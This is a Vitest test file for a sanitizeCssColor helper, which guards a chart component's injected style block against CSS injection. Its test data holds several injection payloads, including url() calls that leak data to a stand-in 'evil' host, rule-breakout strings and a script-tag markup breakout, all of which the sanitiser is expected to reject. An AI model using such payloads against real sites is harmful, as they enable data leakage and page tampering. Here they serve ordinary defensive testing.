import { describe, it, expect } from "vitest"

import { sanitizeCssColor } from "./chart"

/**
 * ChartStyle interpolates ChartConfig color values into an injected <style>
 * block. sanitizeCssColor guards that path against CSS injection / breakout
 * should the config ever be fed dynamically (#70.1).
 */
describe("sanitizeCssColor (#70.1)", () => {
  it.each([
    "#fff",
    "#ffffff",
    "rgb(10, 20, 30)",
    "rgba(10, 20, 30, 0.5)",
    "hsl(210, 40%, 50%)",
    "oklch(0.7 0.1 200)",
    "var(--chart-1)",
    "rebeccapurple",
  ])("passes the valid color %j through unchanged", (color) => {
    expect(sanitizeCssColor(color)).toBe(color)
  })

  it.each([
    "red; } body { background: url(https://evil/?leak) ", // declaration + rule breakout (;, /, :)
    "red; } * { display:none", // rule breakout (;, })
    "url('https://evil/?x')", // exfil via url() (', /, :)
    '"><script>', // markup breakout (", <, >)
    "blue }", // stray closing brace (})
  ])("neutralises the injection payload %j to transparent", (color) => {
    expect(sanitizeCssColor(color)).toBe("transparent")
  })

  it("rejects a value the moment it contains a forbidden char (charset boundary)", () => {
    // The guard is charset-based: the breakout characters ; { } : / and quotes
    // are what make injection possible, so any value containing one is rejected.
    expect(sanitizeCssColor("a:b")).toBe("transparent")
    expect(sanitizeCssColor("a;b")).toBe("transparent")
    expect(sanitizeCssColor("a{b")).toBe("transparent")
  })
})
